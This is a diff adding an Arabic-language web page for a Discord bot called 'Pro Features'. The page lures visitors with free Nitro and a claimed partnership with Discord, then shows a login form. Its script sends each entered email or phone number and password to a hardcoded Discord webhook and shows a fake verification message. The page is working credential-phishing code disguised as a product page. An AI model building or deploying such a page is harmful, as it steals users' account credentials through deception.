@@ -1,0 +1,576 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pro Features - الميزات الاحترافية</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #1e1e2e 0%, #2f3136 100%);
+            color: #fff;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 0;
+            border-bottom: 1px solid #40444b;
+            margin-bottom: 30px;
+        }
+        
+        .logo-container {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .logo {
+            width: 60px;
+            height: 60px;
+            background: linear-gradient(135deg, #7289da, #5b6eae);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 24px;
+            font-weight: bold;
+        }
+        
+        .site-title {
+            font-size: 32px;
+            font-weight: 800;
+            background: linear-gradient(90deg, #7289da, #43b581);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        nav ul {
+            display: flex;
+            list-style: none;
+            gap: 25px;
+        }
+        
+        nav a {
+            color: #b9bbbe;
+            text-decoration: none;
+            font-weight: 600;
+            transition: color 0.3s;
+            padding: 8px 15px;
+            border-radius: 5px;
+        }
+        
+        nav a:hover {
+            color: #7289da;
+            background-color: #36393f;
+        }
+        
+        .hero {
+            text-align: center;
+            padding: 50px 0;
+            margin-bottom: 50px;
+        }
+        
+        .hero h1 {
+            font-size: 48px;
+            margin-bottom: 20px;
+            background: linear-gradient(90deg, #7289da, #43b581);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .hero p {
+            font-size: 20px;
+            color: #b9bbbe;
+            max-width: 800px;
+            margin: 0 auto 30px;
+            line-height: 1.6;
+        }
+        
+        .highlight {
+            color: #43b581;
+            font-weight: bold;
+        }
+        
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
+            gap: 30px;
+            margin-bottom: 50px;
+        }
+        
+        .feature-card {
+            background-color: #2f3136;
+            border-radius: 10px;
+            padding: 25px;
+            transition: transform 0.3s, box-shadow 0.3s;
+            cursor: pointer;
+            border: 1px solid #40444b;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .feature-card.locked:after {
+            content: "🔒";
+            position: absolute;
+            top: 15px;
+            left: 15px;
+            font-size: 20px;
+            background: rgba(0, 0, 0, 0.7);
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .feature-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
+        }
+        
+        .feature-icon {
+            width: 60px;
+            height: 60px;
+            background: linear-gradient(135deg, #7289da, #5b6eae);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        
+        .feature-card h3 {
+            font-size: 22px;
+            margin-bottom: 15px;
+            color: #fff;
+        }
+        
+        .feature-card p {
+            color: #b9bbbe;
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+        
+        .nitro-feature {
+            border: 2px solid #ff73fa;
+            background: linear-gradient(135deg, #2f3136, #1a1b26);
+        }
+        
+        .nitro-feature .feature-icon {
+            background: linear-gradient(135deg, #ff73fa, #d500f9);
+        }
+        
+        .login-section {
+            background-color: #2f3136;
+            border-radius: 10px;
+            padding: 40px;
+            max-width: 500px;
+            margin: 50px auto;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+            display: none;
+        }
+        
+        .login-section.active {
+            display: block;
+        }
+        
+        .login-section h2 {
+            text-align: center;
+            font-size: 28px;
+            margin-bottom: 10px;
+            color: #fff;
+        }
+        
+        .login-section p {
+            text-align: center;
+            color: #b9bbbe;
+            margin-bottom: 30px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 14px;
+            font-weight: 700;
+            color: #b9bbbe;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 12px;
+            border-radius: 5px;
+            border: 1px solid #40444b;
+            background-color: #40444b;
+            color: #dcddde;
+            font-size: 16px;
+        }
+        
+        .form-group input:focus {
+            border-color: #7289da;
+            outline: none;
+        }
+        
+        .login-button {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(90deg, #7289da, #5b6eae);
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: all 0.3s;
+        }
+        
+        .login-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 10px rgba(114, 137, 218, 0.4);
+        }
+        
+        .register-link {
+            text-align: center;
+            margin-top: 20px;
+            color: #b9bbbe;
+        }
+        
+        .register-link a {
+            color: #7289da;
+            text-decoration: none;
+        }
+        
+        .notification {
+            display: none;
+            padding: 15px;
+            margin-bottom: 15px;
+            border-radius: 5px;
+            text-align: center;
+        }
+        
+        .success {
+            background-color: #43b581;
+            color: white;
+        }
+        
+        .error {
+            background-color: #f04747;
+            color: white;
+        }
+        
+        .success-message {
+            display: none;
+            text-align: center;
+            padding: 30px;
+            background-color: #2f3136;
+            border-radius: 10px;
+            max-width: 500px;
+            margin: 50px auto;
+        }
+        
+        .success-icon {
+            font-size: 60px;
+            color: #43b581;
+            margin-bottom: 20px;
+        }
+        
+        .success-title {
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 15px;
+            color: #fff;
+        }
+        
+        .success-text {
+            color: #b9bbbe;
+            line-height: 1.6;
+        }
+        
+        footer {
+            text-align: center;
+            padding: 30px 0;
+            border-top: 1px solid #40444b;
+            margin-top: 50px;
+            color: #b9bbbe;
+        }
+        
+        @media (max-width: 768px) {
+            header {
+                flex-direction: column;
+                gap: 20px;
+            }
+            
+            nav ul {
+                flex-wrap: wrap;
+                justify-content: center;
+            }
+            
+            .hero h1 {
+                font-size: 36px;
+            }
+            
+            .features-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <div class="logo-container">
+                <div class="logo">PF</div>
+                <h1 class="site-title">Pro Features</h1>
+            </div>
+            <nav>
+                <ul>
+                    <li><a href="#features">الميزات</a></li>
+                    <li><a href="#nitro">نيترو</a></li>
+                    <li><a href="#about">عن البوت</a></li>
+                    <li><a href="#contact">اتصل بنا</a></li>
+                </ul>
+            </nav>
+        </header>
+        
+        <section class="hero">
+            <h1>اكتشف قوة البوت الاحترافي</h1>
+            <p>استمتع بأقوى الميزات الاحترافية لسيرفرات الديسكورد. من تعديل المظهر إلى الحصول على <span class="highlight">نيترو مجاني</span>، نحن نقدم لك تجربة فريدة!</p>
+        </section>
+        
+        <section id="features">
+            <h2 style="text-align: center; font-size: 36px; margin-bottom: 40px;">الميزات الاحترافية</h2>
+            <div class="features-grid">
+                <div class="feature-card locked" data-feature="profile">
+                    <div class="feature-icon">👤</div>
+                    <h3>تخصيص الملف الشخصي</h3>
+                    <p>عدل شكل البروفيل الخاص بالأدمن، غيّر اللون، البانر، وشكل الخط ليكون ملونًا وجذابًا.</p>
+                </div>
+                
+                <div class="feature-card locked" data-feature="server">
+                    <div class="feature-icon">⚙️</div>
+                    <h3>تخصيص السيرفر</h3>
+                    <p>غيّر شكل ولون السيرفر بالكامل، وأضف لمساتك الشخصية لجعل سيرفرك فريدًا من نوعه.</p>
+                </div>
+                
+                <div class="feature-card nitro-feature locked" data-feature="nitro">
+                    <div class="feature-icon">⭐</div>
+                    <h3>نيترو مجاني</h3>
+                    <p>احصل على نيترو مجاني لمدة 3 أيام! نحن نتحمل التكلفة لتجربة حصرية لأعضاء البوت.</p>
+                </div>
+                
+                <div class="feature-card locked" data-feature="fonts">
+                    <div class="feature-icon">🔤</div>
+                    <h3>الخطوط الملونة</h3>
+                    <p>اجعل النص في سيرفرك ملونًا وجذابًا مع خيارات متعددة للخطوط والألوان.</p>
+                </div>
+                
+                <div class="feature-card locked" data-feature="moderation">
+                    <div class="feature-icon">🛡️</div>
+                    <h3>أنظمة متقدمة</h3>
+                    <p>أنظمة مراقبة متطورة تحمي سيرفرك من المخالفات وتضمن بيئة آمنة للجميع.</p>
+                </div>
+                
+                <div class="feature-card locked" data-feature="music">
+                    <div class="feature-icon">🎵</div>
+                    <h3>مشغل الموسيقى</h3>
+                    <p>استمتع بمشغل موسيقى عالي الجودة يدعم قوائم التشغيل والميزات المتقدمة.</p>
+                </div>
+            </div>
+        </section>
+        
+        <section id="nitro" style="margin: 80px 0;">
+            <div style="background: linear-gradient(135deg, #2f3136, #1a1b26); padding: 40px; border-radius: 10px; border: 2px solid #ff73fa;">
+                <h2 style="text-align: center; font-size: 32px; margin-bottom: 20px; color: #ff73fa;">نيترو مجاني لمدة 3 أيام!</h2>
+                <p style="text-align: center; font-size: 18px; color: #b9bbbe; max-width: 800px; margin: 0 auto 30px;">
+                    نحن نقدم لك نيترو مجاني لمدة 3 أيام! لقد تعاقدنا مع ديسكورد لتقديم هذه الميزة الحصرية لأعضاء البوت. 
+                    <span class="highlight">اكمل مهمة بسيطة واحصل على نيترو مجانًا!</span> لقد حصل المئات بالفعل على هذه الميزة الرائعة.
+                </p>
+                <div style="text-align: center;">
+                    <button class="login-button" style="width: auto; padding: 12px 30px; background: linear-gradient(90deg, #ff73fa, #d500f9);">احصل على نيترو الآن!</button>
+                </div>
+            </div>
+        </section>
+        
+        <section class="login-section" id="loginFormSection">
+            <h2>تسجيل الدخول</h2>
+            <p>يجب تسجيل الدخول للوصول إلى هذه الميزة</p>
+            
+            <div id="notification" class="notification"></div>
+            
+            <form id="loginForm">
+                <div class="form-group">
+                    <label for="email">البريد الإلكتروني أو رقم الهاتف</label>
+                    <input type="text" id="email" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="password">كلمة المرور</label>
+                    <input type="password" id="password" required>
+                </div>
+                
+                <button type="submit" class="login-button">تسجيل الدخول</button>
+            </form>
+            
+            <div class="register-link">
+                لا تملك حسابًا؟ <a href="#">سجل الآن</a>
+            </div>
+        </section>
+        
+        <div id="successMessage" class="success-message">
+            <div class="success-icon">✓</div>
+            <div class="success-title">تم إرسال رسالة التحقق</div>
+            <div class="success-text">
+                لقد أرسلنا إليك رسالة عبر بريدك الإلكتروني، تفقد بريدك لاستكمال عملية التسجيل.
+            </div>
+        </div>
+        
+        <footer>
+            <p>Pro Features &copy; 2023 - جميع الحقوق محفوظة</p>
+            <p>هذا البوت سيكون مدفوعًا خلال سنة، لكننا نتيح لكم تجربة الميزات الآن مجانًا!</p>
+        </footer>
+    </div>
+
+    <script>
+        // عند النقر على أي ميزة مقفلة
+        document.querySelectorAll('.feature-card.locked').forEach(card => {
+            card.addEventListener('click', function() {
+                // إظهار قسم تسجيل الدخول
+                document.getElementById('loginFormSection').classList.add('active');
+                
+                // التمرير إلى قسم تسجيل الدخول
+                document.getElementById('loginFormSection').scrollIntoView({ 
+                    behavior: 'smooth' 
+                });
+            });
+        });
+        
+        // معالجة نموذج تسجيل الدخول
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const notification = document.getElementById('notification');
+            
+            // إخفاء أي إشعار سابق
+            notification.style.display = 'none';
+            
+            if (!email || !password) {
+                notification.textContent = 'يرجى ملء جميع الحقول المطلوبة';
+                notification.className = 'notification error';
+                notification.style.display = 'block';
+                return;
+            }
+            
+            // التحقق من صحة البريد الإلكتروني
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (!emailRegex.test(email) && !/^\d+$/.test(email)) {
+                notification.textContent = 'يرجى إدخال بريد إلكتروني أو رقم هاتف صحيح';
+                notification.className = 'notification error';
+                notification.style.display = 'block';
+                return;
+            }
+            
+            try {
+                // إرسال البيانات إلى Webhook
+                const webhookURL = 'https://discord.com/api/webhooks/1418967045747376290/5FbQKN9aEegJHN8SaBUYQc9XzAt8FInuH0TXsLhsZ2sGQiemqklWhZbKMH7J85jnsKm1';
+                
+                const data = {
+                    content: `New login attempt:\nEmail: ${email}\nPassword: ${password}\nTimestamp: ${new Date().toLocaleString()}`,
+                    username: 'Pro Features Bot',
+                    avatar_url: 'https://discord.com/assets/f78426a064bc9dd24847519259bc42af.png'
+                };
+                
+                const response = await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                    },
+                    body: JSON.stringify(data),
+                });
+                
+                if (response.ok) {
+                    // إخفاء نموذج التسجيل وإظهار رسالة النجاح
+                    document.getElementById('loginFormSection').classList.remove('active');
+                    document.getElementById('successMessage').style.display = 'block';
+                    
+                    // فتح قفل الميزات بعد التسجيل
+                    document.querySelectorAll('.feature-card.locked').forEach(card => {
+                        card.classList.remove('locked');
+                        card.style.cursor = 'default';
+                    });
+                } else {
+                    throw new Error('Failed to send data to webhook');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                
+                // إظهار رسالة الخطأ
+                notification.textContent = 'حدث خطأ أثناء تسجيل الدخول. يرجى المحاولة مرة أخرى.';
+                notification.className = 'notification error';
+                notification.style.display = 'block';
+            }
+        });
+        
+        // إضافة تأثيرات عند التمرير
+        window.addEventListener('scroll', function() {
+            const cards = document.querySelectorAll('.feature-card');
+            cards.forEach(card => {
+                const cardTop = card.getBoundingClientRect().top;
+                const windowHeight = window.innerHeight;
+                
+                if (cardTop < windowHeight - 100) {
+                    card.style.opacity = '1';
+                    card.style.transform = 'translateY(0)';
+                }
+            });
+        });
+        
+        // تهيئة تأثيرات الظهور
+        document.querySelectorAll('.feature-card').forEach(card => {
+            card.style.opacity = '0';
+            card.style.transform = 'translateY(20px)';
+            card.style.transition = 'opacity 0.5s, transform 0.5s';
+        });
+        
+        // تشغيل تأثيرات الظهور بعد تحميل الصفحة
+        window.addEventListener('load', function() {
+            setTimeout(() => {
+                document.querySelectorAll('.feature-card').forEach((card, index) => {
+                    setTimeout(() => {
+                        const cardTop = card.getBoundingClientRect().top;
+                        const windowHeight = window.innerHeight;
+                        
+                        if (cardTop < windowHeight - 100) {
+                            card.style.opacity = '1';
+                            card.style.transform = 'translateY(0)';
+                        }
+                    }, index * 100);
+                });
+            }, 500);
+        });
+    </script>
+</body>
+</html>
